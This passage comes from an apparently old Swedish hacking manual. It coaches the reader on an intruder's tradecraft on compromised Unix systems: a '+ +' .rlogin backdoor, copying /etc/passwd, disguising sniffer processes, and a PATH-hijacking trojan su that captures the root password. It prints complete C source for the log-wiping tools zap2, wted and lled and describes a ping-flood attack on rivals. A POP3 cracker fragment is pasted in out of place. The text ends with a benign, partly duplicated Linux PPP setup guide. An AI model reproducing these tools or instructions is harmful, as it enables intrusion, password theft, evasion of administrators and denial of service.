| |   |   |--------> Övriga användare kan läsa och köra filen.
| |   |------------> Gruppen kan läsa, skriva till och köra filen.
| |----------------> Ägaren kan läsa, skriva till och köra filen.
|------------------> Det är en katalog

Ok, så nu kanske du har förstått vad de olika bokstäverna står för?:

R = Read (Läs rättighet, man får läsa/öppna filen, se innehållet).
W = Write (Skriva till, redigera, ta bort filen, byta namn eller flytta den).
X = Execute (Köra filen om det är ett program/procedur/kommando).
- =  Uppgift saknas (t.ex. om filen inte är en katalog, eller om en rättighet saknas. 
          Om det ÄR en katalog så står ett ”d” i början av raden. Annars är det ett sträck.)

När du har root kan du ändra rättigheter med mer för alla filer och kataloger
Du kan förståss alltid ändra på filer/kataloger om det är du som är ägaren:

chmod oug+r filnamn ? Detta gör så att både ägaren, gruppen och övriga kan
		 läsa filen. (O = Others, U = User, G = Group) +r = (	
	 plus READ).

chmod og-r filnamn ? Detta gör så att bara ägaren (U = User), kan läsa
filen. (Observera att - och + anges för att GE & TA)

chmod +x filnamn   ? Gör så att alla kan köra filen (varken O U eller G
                       anges. Det tar UNIX som ett ”alla!”.)

chown user filnamn ? User byts ut mot den användare som ska få ”ägande                 
                      rättigheten”. Endast ägaren av filen eller root kan          
                      ändra detta (som vanligt)

chgrp gruppnamn filnamn ? Gör så att filen ägs av en annan grupp.
                          (gruppnamn)


Ändra inte inställningarna eller rättigheterna innan du vet vem som äger filen och vad det är
för fil mm.. Det kan få ägaren/gruppen eller sysadmin att bli fundersam, han/hon spårar dig
och sätter dit dig helt enkelt. Ta det lugnt!

rlogin.

Det finns ett annat kommando än Telnet för att logga in på ett konto också. Det är rlogin.
Läs ”man” sidorna om rlogin först av allt!
Standard kommandot är väl:

rlogin –l användarnamn lösenord
connecting....
password:

bash$

På servern finns det en .rlogin fil i användarens hemkatalog som talar om för servern
vilket system som den kan ta emot rlogin från. Den filen kan se ut såhär:

username hostname (or) hostname

Om du skulle lägga till en rad med ”+ +” i den här filen, det skulle låta vem som helst,
från vilket system som helst, utan lösenord, att logga in i systemet!
Om det redan finns ett användarnamn i rlogin filen så kan du lägga till raden:
+ +
under loginname-raden. Men då skulle nog användare snart upptäcka att man kunde
logga in utan lösenord..

Ett annat sätt att logga in på är med kommandot FTP:
ftp ftp.hostname.com 
Mer om FTP senare.

GCC Compiler

Du kommer flera gånger, säkerligen, behöva kompilera en .c fil till körbart format.
Det smartaste är ju att kopiera C-koden du vill kompilera, logga in i ditt hackade system,
pasta in koden i en ny .c fil, spara den och kompilera den. (För er som inte vet, så är en .c fil, 
en sådan fil som man sparar C-kod i. Alltså, C/C++ programmering… Sedan kompilerar man
koden, man översätter den till maskinkod som datorn kan förstå. Man gör den till en körbar-
-fil). Så.. Du pastar in koden och kompilerar.. (pasta = klistra in). Detta för att undvika 
onödiga loggar. 

För att kopiera och klistra in så tar du helt enkelt och kopierar koden från din andra session,
öppnar en textredigerare på din hackade dator och klistrar in koden där. Sedan sparar du filen
som t.ex. i vårat exempel: $HOME/kodfil.c

Samma sak gäller om du ska ladda hem password filen via FTP, spara den då först i din
egen hemkatalog med ett annat namn: 
bash:/etc:> cp passwd $HOME/plog 

(Om jag inte redan har sagt det så är jag dum, du hittar lösenordsfilen och gruppfilen för
UNIX i: /etc. Oftast ser adressen ut såhär (i en webläsare):

ftp://ftp.blablabla.com/etc/passwd
ftp://ftp.blablabla.com/etc/group

eller

ftp://blablabla.com/etc/passwd
ftp://blablabla.com/etc/group

Så.. Nu vet du det.
Ett annat bra sätt att skicka en fil lite osynligt på är genom att skapa en DCC session
med en kompis/med en annan dator.. (man sänder filen över IRC), för att göra det
använder man kommandot: 

/dcc send <nick> <filnamn>

mottagaren tar emot genom att använda kommandot:

/dcc get <nick> <filnamn>

Det vore ganska bra att ha en IRCbot på ett shell som tog emot alla filer den fick från ett
speciellt nickname va?

GCC kompilatorn är iaf enkel!:

gcc filnamn.c –o nytt_filnamn

Så! Om jag nu ville kompilera en fil vid namn ”rune.c” som låg i den aktuella katalogen,
och jag ville att den skulle heta mittprogram när den var klar, skulle jag skriva:

gcc rune.c –o mittprogram

Enkelt va? Om jag bara skrev ”/gcc rune.c” skulle jag få en fil vid namn a.out , och jag skulle
vara tvungen att döpa om den till ”mittprogram” för att kunna använda den. Kommandot är
då:



mv a.out mittprogram

Om du skaffar dig en källkod med ett namn som ”zap” eller ”sniffer”, så borde du
naturligtvis döpa om dessa till något som inte en anti-dåliga-program-scanner skulle
kunna känna igen namnet på.. Som inte en admin skulle känna igen namnet på,
t.ex. döpa om ”sniffer” till ”execzip” eller vad som helst!

Det kommer också vara de gånger du vill köra ett program i bakgrunden även
när du har loggat ut från kontot. För att göra detta så lägger du bara till ett ”&” framför
programnamnet. Om du tillexempel skulle köra vårat program ”mittprogram” så skulle
du skriva:

&mittprogram

För att inte någon ska undra vad det är föreslår jag att du döper programmet till något
som mera liknar de andra programmen som körs i bakgrunden.
För att här, likt med Ctrl-Alt-Delete kommandot i Windows, se vilka program som körs,
kan du använda ps kommandot. Ps står helt enkelt för ”process” och visar vilka processer
som för tillfället körs. Använd också växlarna auxe och titta på resultatet i programmet
”more” för att inte missa något:

ps -auxe |more

a = alla
u = users
x = du själv
e = env

På vissa maskiner måste man skriva ”pstree” för att få se listan.
Sedan får du se listan, döp programmet till något som liknar något av det du får se i listan!
Sedan så kör du programmet.. med ett & framför.
Kolla sedan ps –auxe |more  igen, för att se om din process(ditt program) körs.

___________________________________________________________________________

Om du har fått access till en admins konto, så kanske du vill kolla hans history-filer för att
se om han ofta använder su-kommandot för att komma åt root. Om han gör det så kan du 
använda en trojan eller keylogger för att få tag på lösenordet till root. Det funkar så här:
Du ändrar i adminens shellscript så att en ny, dold katalog (.term eller nåt sånt är bra), läggs
till före alla andra katalogen i ”sök pathén”. Alltså, innan alla de andra katalogerna som unix
ska söka igenom efter det kommando som personen ifråga använder.. Försök förstå bara! ;-).
Du lägger till en körbar su-fil i .term katalogen (eller vilken katalog du nu valde).
Sedan när administratören (admin) kommer in, skriver su kommandot, och allt ser bra ut,
skriver vidare in lösenordet och då kopieras lösenords id:t till en logfil i: /tmp/.elm69
sedan raderas trojan-su-filen och ger honom ett ”fel lösenord” meddelande och låter honom
försöka igen. Denna gången går allt bra eftersom att vår lilla trojan har raderats och Unix
kör den äkta su filen istället.



1. Ändra pathen i en av de användarkonton som du har access till som du ser använder SU
genom att titta i historie filerna. Ändra pathen så att katalogen som du har lagt din SU trojan i
kommer först i listan.

2. Var säker på att du redigerar toppen av SU.c filen till den path (sökväg!) du kommer att
använda, så att sutrojanen raderar sig själv och låter den riktiga SU filen arbeta för nästa 
försök.

3. Lägg alla filerna i adminens katalog och kompilera su.c filen!

gcc su.c –o su

 Radera till sist alla filerna utom su filen, och allt är klart!


.bash_profile filen ser kanske ut såhär:

# .bash_profile

# Get the aliases and functions
if [ -f ~/.bashrc ]; then
        . ~/.bashrc
                fi

# User specific environment and startup programs

PATH=$PATH:$HOME/bin
ENV=$HOME/.bashrc
USERNAME=""

export USERNAME ENV PATH

Då ska du helt enkelt nu ta och ändra den första raden till: 
PATH=$HOME/.term:$PATH:$HOME/bin

Nu kopierar trojanen lösenordet till root (eller om det var ett annat konto, (det talar logfilen’
om)), till en logfil i /temp. Sedan raderar den sig själv och återställer allt så att det blir frid
och fröjd igen. Allt detta då efter att admin har skrivit sitt su kommando..
Gör nu inte detta själv! Då måste du göra om allt igen.

Historie filerna finns i användarnas hemkataloger (HOME). De kan innehålla så mycket som
de 100 senaste kommandona / raderna skrivna av kontoägaren. Leta här speciellt efter filerna
.bash_history eller History. Läs dem med hjälp av more. (more .bash_history).

Ok ok ok.. Gömma dina spår lite..
Här är en .c fil som du kan använda till att rensa dina spår efter det att du loggat in i systemet:
(kopiera in i en texteditor i ditt hackade system, spara som .c fil och kompilera med gcc.):






#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

/* First, define the POP-3 port - almost always 110 */
#define POP3_PORT               110

/* What we want our program to be masked as, so nosy sys admin's don't kill us */
#define MASKAS                  "vi"

/* Repeat connect or not - remember, logs still report a connection, so
you might want to set this to 0. If set to 0, it will hack until it finds
1 user/password then exit. If set to 1, it will reconnect and try more
user/passwords (until it runs out of usernames) */
#define RECONNECT       0


Mer om att göra dig själv osynlig:

Det hela går ut på att du ska försöka ha kvar din access så länge som möjligt, lär dig systemet,
lär dig genom att utforska det, kolla på hur olika exploits fungerar, det är detta som är
meningen!! Om du förstör eller visar dig för admins så är det kört, du blir utkickad och
anmäld. Så nu ska jag berätta mer om hur du håller dig osynlig.

Det finns ett antal loggfilsrensnings program där ute, det troligen bästa är Zap2.
Jag laddade hem zap2 och kompilerade det till namnet z2.

Zap ska köras så fort man loggat in som root på systemet. Du kanske först vill kolla med 
finger @host.xxx för att se vilka som är inloggade. Kolla IDLE tiden för root och admin
för att se om de inte är aktiva. Så fort du har loggat in på systemet med ett annat konto,
kolla vilka som är på och deras idle tid med kommandot: w. Logga sedan snabbt in som
root och kör lika hastigt zap programmet. (I mitt fall skriver jag då):
./z2 mitt-login-namn 
Kolla nu med w eller who , att du inte syns i listan!

Du kommer vara tvungen att kolla vart alla filer i systemet finns och redigera z2.c filen så
att den innehåller den rätta lokaliseringen av dessa filer.
Här är arean som du kollar efter alldeles i början av filen:

#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"

De flesta systemen man loggar in på är:

#define WTMP_NAME "/var/adm/wtmp"
#define UTMP_NAME "/var/adm/utmp"
#define LASTLOG_NAME "/var/adm/lastlog"

Kolla runt själv. /var/log: är också en vanlig placering.
Lägg till lokaliseringarna för varje system i filen och kompilera..
Här är zap2.c filen:

z2.c
--------------------------- klipp här
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"
 
int f;
 
void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;
 
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}
 
void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;
 
    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
 
     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}
 
void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
 
     if ((pwd=getpwnam(who))!=NULL) {
 
        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }
 
    } else printf("%s: ?\n",who);
}
 
main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Error.\n");
}
--------------------------- klipp här


Andra scripts

Låt oss nu säga att du har loggat in och kört din zap fil.
Du måste nu FTP:a in för att ”grab:a” en fil.
(Kom ihåg att aldrig FTP:a eller Telnet:a ut från kontot!)
Ok, du FTP:ar in och grab:ar ett par filer, eller loggar in på ett annat konto på systemet.
Nu blir du tvungen att använda wted. wted låter dig redigera wtmp:en för att ta bort ditt
login från FTP:n. Du kanske också behöver använda dig av lld (lastlog edit).
Här är menyn om du skriver ./wted, efter att ha satt log sökväg och kompilerat:


[8:25pm][/home/compile]wted
Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
            -h      This help
            -f      Use FILE instead of default
            -a      Show all entries found
            -u      Show all entries for USER
            -b      Show NULL entries
            -e      Erase USER completely
            -c      Erase all connections containing HOST
            -z      Show ZAP'd entries
            -x      Attempt to remove ZAP'd entries completely


Så om jag FTP:ar till användarnamnet smith skulle jag skriva wted –x –e .
Programmet kommer nu att prompta dig ett login i taget för användaren smith,
och fråga om du verkligen vill ta bort det.
Efter att du tagit bort ditt login, var då säker på att du gör 
chmod 664 wtmp.tmp och sedan kopierar den till katalogen ett steg upp i logg systemet:


1. chmod 644 wtmp.tmp
2. cp wtmp.tmp /var/adm/wtmp

Ok, här är nu wted programmet:

OBS:  FÖRSÄKRA DIG OM ATT DU HAR RÄTT SÖKVÄG TILL ”char filen” under,
Så att du får rätt sökväg till wtmp filen!

wted.c
---------------------- klipp här!


#include <stdio.h>
#include <utmp.h>
#include <time.h>
#include <fcntl.h>

char *file="/var/adm/wtmp";

main(argc,argv)
int argc;
char *argv[];
{
int i;
if (argc==1) usage();
for(i=1;i<argc;i++)
	{
	if(argv[i][0] == '-')
		{
		switch(argv[i][1])
			{
			case 'b': printents(""); break;
			case 'z': printents("Z4p"); break;
			case 'e': erase(argv[i+1],0); break;
			case 'c': erase(0,argv[i+1]); break;
			case 'f': file=argv[i+1]; break;
			case 'u': printents(argv[i+1]); break;
			case 'a': printents("*"); break;
			case 'x': remnull(argv[i+1]); break;
			default:usage();
			}
		}
	}
}

printents(name)
char *name;
{
struct utmp utmp,*ptr;
int fp=-1;
ptr=&utmp;
if (fp=open(file,O_RDONLY))
	{
	while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp))
		{
		if ( !(strcmp(name,ptr->ut_name)) || (name=="*") ||
		(!(strcmp("Z4p",name)) && (ptr->ut_time==0)))
			printinfo(ptr);
		}
	close(fp);
	}
}

printinfo(ptr)
struct utmp *ptr;
{
char tmpstr[256];
printf("%s\t",ptr->ut_name);
printf("%s\t",ptr->ut_line);
strcpy(tmpstr,ctime(&(ptr->ut_time)));
tmpstr[strlen(tmpstr)-1]='\0';
printf("%s\t",tmpstr);
printf("%s\n",ptr->ut_host);
}

erase(name,host)
char *name,*host;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct utmp utmp;
unsigned char c;
if (fp=open(file,O_RDONLY)) {
        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
		if (host)
			if (strstr(utmp.ut_host,host)) tot++;
			else {cnt++;write(fd,&utmp,sizeof(struct utmp));}
		if (name) {
                if (strcmp(utmp.ut_name,name)) {cnt++;
			write(fd,&utmp,sizeof(struct utmp));}
		else { 
			if (n>0) {
				n--;cnt++;
				write(fd,&utmp,sizeof(struct utmp));}
			else
			{
			printinfo(&utmp);
			printf("Erase entry (y/n/f(astforward))? ");
			c='a';
			while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
			if (c=='f') {
				cnt++;
				write(fd,&utmp,sizeof(struct utmp));
				printf("Fast forward how many entries? ");
				scanf("%d",&n);}
			if (c=='n') {
				cnt++;
				write(fd,&utmp,sizeof(struct utmp));
				}
			if (c=='y') tot++;
			} 
		      }	}			
		
        }
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
}

remnull(name)
char *name;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct utmp utmp;
if (fp=open(file,O_RDONLY)) {
        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
		if (utmp.ut_time) {
			cnt++;
			write(fd,&utmp,sizeof(struct utmp));
		}
		else
			tot++;
	}
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
}

usage()
{
printf("Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST\n");
printf("\t-h\tThis help\n");
printf("\t-f\tUse FILE instead of default\n");
printf("\t-a\tShow all entries found\n");
printf("\t-u\tShow all entries for USER\n");
printf("\t-b\tShow NULL entries\n"); 
printf("\t-e\tErase USER completely\n");
printf("\t-c\tErase all connections containing HOST\n");
printf("\t-z\tShow ZAP'd entries\n");
printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
}



---------------------- klipp här


Du kanske också måste rensa upp i filen /vat/adm/lastlog
För att göra detta använder du programmet lled.c. Kompilera programmet och
döp om det till lled.
Här är menyn av kommandon för programmet när du skriver in kommandot ./lled :

[4:04am][/home/paris/compile]lled
Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
-h      This help
-f      Use FILE instead of default
-a      Show all entries found
-u      Show all entries for USER
-b      Show NULL entries
-e      Erase USER completely
-c      Erase all connections containing HOST
-z      Show ZAP'd entries
-x      Attempt to remove ZAP'd entries completely

Det vore bra att kolla genom att först använda –u , men många gånger kommer det inte att
visa ditt host. Men om du vet vad du letar efter kan du skriva (om du kommer från
macine.host.com):

lled –e username –c machine.host

Om du måste kolla lastlog så borde naturligtvis ditt hostname finnas längst ned.
Skriv bara: lled –a

chmod:a filen lastlog.tmp 664 och kopiera den till katalogen ett steg uppåt.

FÖRSÄKRA DIG OM ATT DU FIXAR SÖKVÄGEN TILL DIN LASTLOG NEDAN:
Ok; här är lastlog programmet:

-------------------------- klipp här
#include <stdio.h>
#include <time.h>
#include <lastlog.h>
#include <fcntl.h>

char *file="/var/adm/lastlog";

main(argc,argv)
int argc;
char *argv[];
{
int i;
if (argc==1) usage();
for(i=1;i<argc;i++)
	{
	if(argv[i][0] == '-')
		{
		switch(argv[i][1])
			{
			case 'b': printents(""); break;
			case 'z': printents("Z4p"); break;
			case 'e': erase(argv[i+1]); break;
                        case 'c': erase(0,argv[i+1]); break;
			case 'f': file=argv[i+1]; break;
			case 'u': printents(argv[i+1]); break;
			case 'a': printents("*"); break;
			case 'x': remnull(argv[i+1]); break;
			default:usage();
			}
		}
	}
}

printents(name)
char *name;
{
struct lastlog utmp,*ptr;
int fp=-1;
ptr=&utmp;
if (fp=open(file,O_RDONLY))
	{
	while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog))
		{
		if ( !(strcmp(name,ptr->ll_line)) || (name=="*") ||
		(!(strcmp("Z4p",name)) && (ptr->ll_time==0)))
			printinfo(ptr);
		}
	close(fp);
	}
}

printinfo(ptr)
struct lastlog *ptr;
{
char tmpstr[256];
printf("%s\t",ptr->ll_line);
strcpy(tmpstr,ctime(&(ptr->ll_time)));
tmpstr[strlen(tmpstr)-1]='\0';
printf("%s\t",tmpstr);
printf("%s\n",ptr->ll_host);
}

erase(name,host)
char *name,*host;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct lastlog utmp;
unsigned char c;
if (fp=open(file,O_RDONLY)) {
        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog)) {
                if (host)
                        if (strstr(utmp.ll_host,host)) tot++;
                        else {cnt++;write(fd,&utmp,sizeof(struct lastlog));}
                if (name) {
		if (strcmp(utmp.ll_line,name)) {cnt++;
			write(fd,&utmp,sizeof(struct lastlog));}
		else { 
			if (n>0) {
				n--;cnt++;
				write(fd,&utmp,sizeof(struct lastlog));}
			else
			{
			printinfo(&utmp);
			printf("Erase entry (y/n/f(astforward))? ");
			c='a';
			while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
			if (c=='f') {
				cnt++;
				write(fd,&utmp,sizeof(struct lastlog));
				printf("Fast forward how many entries? ");
				scanf("%d",&n);}
			if (c=='n') {
				cnt++;
				write(fd,&utmp,sizeof(struct lastlog));
				}
			if (c=='y') tot++;
			} 
		      }	}			
		
        }
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
}

remnull(name)
char *name;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct lastlog utmp;
if (fp=open(file,O_RDONLY)) {
        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog)) {
		if (utmp.ll_time) {
			cnt++;
			write(fd,&utmp,sizeof(struct lastlog));
		}
		else
			tot++;
	}
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
}

usage()
{
printf("Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST\n");
printf("\t-h\tThis help\n");
printf("\t-f\tUse FILE instead of default\n");
printf("\t-a\tShow all entries found\n");
printf("\t-u\tShow all entries for USER\n");
printf("\t-b\tShow NULL entries\n"); 
printf("\t-e\tErase USER completely\n");
printf("\t-c\tErase all connections containing HOST\n");
printf("\t-z\tShow ZAP'd entries\n");
printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
}
---------------------------------------------------------------- klipp här




Kapitel 5: Smurf Attacks

Har du någonsin hört talas om de så kallade ”Smurf Attackerna” som folk använder för att få bort 
sina ovänner från nätet?? – Jag vet att det känns lite lamt att ta upp det så här i tredje boken av HM,
men det har liksom inte kommit med tidigare. Och detta kan i många fall vara mer effektivt än nukes!

- Så. Vad är detta??

När du skickar en ping till någon så kommer ju alltid de paket du skickar tillbaka, så att du ser hur lång
tid det tog för förbindelsen att skicka och ta emot paketen… Så, vad jag får fram genom detta är att 
paketen tar upp bandbredd för både din och den du pingar ´s anslutning! Vilket gör att ni båda hamnar
efter (”laggar”) och det går mycket långsammare att surfa mm..
Men om inte paketen skulle komma tillbaka så kunde du skicka paket mycket snabbare!
Då skulle ju också mottagarens anslutning bli ÄNNU sämre, kanske till och med kopplas ned!!

Så vad vi behöver är… Hmm,, ja, någonting som hindrar paketen att nå fram till vår egen dator.
Detta görs enkelt genom att använda en firewall! Ett firewall program kan du ladda hem lite här
och där på Internet. [ Det svenska ordet för firewall är ”Brandvägg”. ].
En Firewall filtrerar alltså inkommande information från nätet. Det kan vara nukar, pings, ICMP
grejor och annat. T.o.m. om någon försöker ansluta till din dator med Back Orifice, Evil FTP eller
NetBus etc.. Så varnar programmet och låter dig välja mellan att ignorera, acceptera eller blockera
anslutningen. Poängen är att inga paket kan återvända till din dator och att du på så sätt kan pinga
din ovän mycket snabbare. Ladda också ner en pinger som tillåter kloner!
Du kan då pinga någon med 65000 bytes gånger 10 !!! (10 kloner) vilket blir ”FETT_MYCKET”! ;-).
En bra sådan pinger är ”Fortune 2k” ( Final Fortune ).

 

Kapitel 6: Mera UNIX

Nu har du säkert suttit med Redhat Linux och pjåkat med X-Windows och en massa krafs,
Du har kanske hittat fönsterhanterare och skal mm.. Så jag tror att du vill få igång Internet nu.
Även om du inte har ett lika fint skal som Windows var för DOS, så kommer du nu få hjälp
med att koppla upp dig direkt från den mörka kod-skärmen.
Ni som har hittat en fin fönsterhanterare har nog redan hittat Internet uppkopplingen.
Följ med här nu bara!

Nätverk

I detta kapitel ska jag visa hur du konfigurerar nätverksfunktionerna i Linux.
Linux går att använda i många olika situationer och jag har hört talas om ett antal fall
där Linux nästan varit den enda lösningen att koppla ihop Windows-, Macintosh-, Novell-,
och Unix-baserade nätverk. I ”vanliga” operativsystem skulle du få betala tusan
för varje extra arkitektur.

Linux kan med hjälp av Samba-sviten vara server och klient till Windows-nätverk med
utdelade resurser och allt vad det kallas. Man kan dela filer och skrivare och det skall även
funka att använda Linux som domänserver som du kan logga in på precis som med NT.
Det finns liknande programsviter till Macintosh och Novell. Linux är ju ungefär Unix så det
mesta i den vägen fungerar också.

Nätverkskort

De flesta nätverkskort fungerar bra i Linux, det största problemet är förmodligen
de kort som går under Plug’n’Play-stämpeln. Speciellt ISA-korten är problematiska,
PCI är oftast inga större problem. Du får titta lite i dina BIOS-inställningar.
Ofta kan du välja att du inte har något PnP-operativsystem och att korten inte skall
nollställas vid omstart. Har du tur kan du stänga av PnP funktionen på kortet genom
något inställningsprogram på ”den medföljande disketten”.

Till ISA PnP-kort finns paketet isapnptools, men det är väldigt bökigt, både att konfigurera
programmen och att få det att fungera i verkligheten. Det är möjligt att det kommer PnP-stöd
till kärnan. Det har diskuterats ett tag om man över huvudtaget vill ha det, PnP är inte särskiljt
populärt inom Linuxvärlden, i alla fall inte bland halvreligiösa veteraner.

Om du ska köpa nätverkskort kan du titta i Ethernet-HOWTO och Hardware-HOWTO;
där står vilka kort som fungerar och vilka som inte gör det. Det finns många billiga modeller
som är NE2000-kompatibla. Om de är dåliga blir det problem. Dessa kort bör du inte sätta i
servrar eftersom de inte alltid håller speciellt bra men hur som helst har Linux bra NE2000-
drivrutiner. Men försök att se till så du kan aktivera PnP…

Konfiguration

När du installerade Linux hittade den kanske ditt nätverkskort och du skrev in IP adress,
värdnamn osv. Fungerar det som det ska så är det perfekt. Du kan titta på och ändra
inställningarna med programmet ifconfig, men du måste vara root när du vill ändra.
Här finner du en massa inställningar som jag tyvärr inte hinner gå igenom här och nu.
Testa ”man ifconfig”, ”whatis ifconfig” och  ”what is ifconfig” för att få mer info.

Internetabonnemang
                       och Linux

Har du problem att få till din Linux-uppkoppling mot Internet? Läs i så fall vidare, ty här 
finner du en scriptgenerator som ställer
några frågor om ditt Internet-konto och utifrån dina svar skapas sedan de script och filer som 
behövs för uppkopplingen. 

Programmet är testat mot Algonet, Tele2, Telenordia, Telia och Tripnet med gott resultat. Det 
bör även fungera mot Calypso
och IBM. 



Inledning


Många nya Linux-användare brukar ha problem med att koppla upp sig mot Internet. Detta 
har flera orsaker. Viktigast är nog
att de flesta Internet-leverantörer inte sett det som någon viktig uppgift att ta fram korrekta 
och lättbegripliga instruktioner för Linux, men också på att det faktiskt kan vara lite krångligt 
att ordna. Detta dokument och tillhörande filer syftar till att reducera problemen till ett 
minimum genom att till stor del automatisera installationen. För detta utnyttjas ett program 
(pppinst.sh), som frågar efter Internetleverantör och de uppgifter som behövs för att ringa upp 
(telefonnumret) och logga in på leverantörens server (användarnamn och lösenord). Därefter 
skapas automatiskt de script och hjälpfiler som behövs för uppkopplingen. 

De Internetleverantörer som installationsprogrammet f n bör kunna klara är Algonet, Calypso, 
IBM, Tele2, Telenordia, Telia och Tripnet. 

Installationsprogrammet skapar två script (ppp-on och ppp-off) som används vid upp- resp 
nedkoppling till Internetleverantören. Programmet gör det möjligt att välja om man vill att 
alla användare skall kunna koppla upp sig mot Internet eller inte - tänk dock på att detta att 
låta alla användare att göra uppkopplingen innebär en säkerhetslucka som kanske inte spelar 
någon roll i hemmet, men som absolut inte bör förekomma i system med många användare.

Många nya Linux-användare brukar ha problem med att koppla upp sig mot Internet. Detta 
har flera orsaker. Viktigast är nog att de flesta Internet-leverantörer inte sett det som någon 
viktig uppgift att ta fram korrekta och lättbegripliga instruktioner för Linux, men också på att 
det faktiskt kan vara lite krångligt att ordna. Detta dokument och tillhörande filer syftar till att 
reducera problemen till ett minimum genom att till stor del automatisera installationen. För 
detta utnyttjas ett program (pppinst.sh), som frågar efter Internetleverantör och de uppgifter 
som behövs för att ringa upp (telefonnumret) och logga in på leverantörens server 
(användarnamn och lösenord). Därefter skapas automatiskt de script och hjälpfiler som 
behövs för uppkopplingen. De Internetleverantörer som installationsprogrammet f n bör 
kunna klara är Algonet, Calypso, IBM, Tele2, Telenordia, Telia
och Tripnet. 

Installationsprogrammet skapar två script (ppp-on och ppp-off) som används vid upp- resp 
nedkoppling till Internetleverantören. Programmet gör det möjligt att välja om man vill att 
alla användare skall kunna koppla upp sig mot Internet eller inte - tänk dock på att detta att 
låta alla användare att göra uppkopplingen innebär en säkerhetslucka som kanske inte spelar 
någon roll i hemmet, men som absolut inte bör förekomma i system med många användare. 







Förberedelser

Samla ihop de uppgifter du fått av Internetleverantören: telefonnummer, ditt 
användarnamn (loginnamn) och lösenord, samt IP-adresserna till de namnservrar som
tillhandahålls. Tag reda på vilken serieport som ditt modem är anslutet till.
Hämta hem shellarkivet ppp.shar som innehåller alla nödvändiga filer. Ladda hem ppp.shar 
    
 Skapa en katalog dit du kopierar shellarkivet ppp.shar och placera dig i katalogen. Om 
arkivet redan är i en lämplig katalog kan du strunta i kopieringen, men katalogen bör helst 
vara tom, bl a därför att det i annat fall kan hända att vissa filer inte packas upp från arkivet, 
ty detta är konstruerat så att inga redan existerande filer skrivs över.  Packa upp shellarkivet 
med kommandot sh ppp.shar 

Installation

Installationen kräver att man är inloggad som root: Logga in som root om du inte redan är det! 

Du skall av din leverantör ha fått IP-adresser till namnservrar (adresserna har formen 
xxx.xxx.xxx.xxx, där xxx är ett tal 0-255). 
Dessa skall fogas till filen /etc/resolv.conf. Detta kan du göra så här: 
               Flytta till katalogen /etc (med kommandot cd /etc) 
               Starta en editor för att redigera filen resolv.conf. (t ex pico resolv.conf) 
               Skriv in IP-adresserna för namnservrarna (1 per rad och stava rätt!), t ex nameserver
               130.237.225.199 

     Kör programmet pppinst.sh genom att skriva 

          ./pppinst.sh 

